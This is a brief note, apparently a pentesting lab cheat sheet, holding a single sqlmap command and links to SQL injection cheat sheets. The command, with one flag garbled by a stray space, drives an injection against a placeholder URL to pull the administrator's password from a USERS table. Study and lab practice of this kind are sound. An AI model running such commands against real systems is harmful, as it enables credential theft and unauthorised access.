____

```bash
sqlmap -u "URL" --cookie='lab=cookie' --level 5 --risk 3 -p param --batch --threads 10 --dbms=postgresql --sq l-query="SELECT password from USERS where username='administrator'"
```

[https://tib3rius.com/sqli](https://tib3rius.com/sqli) 

[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


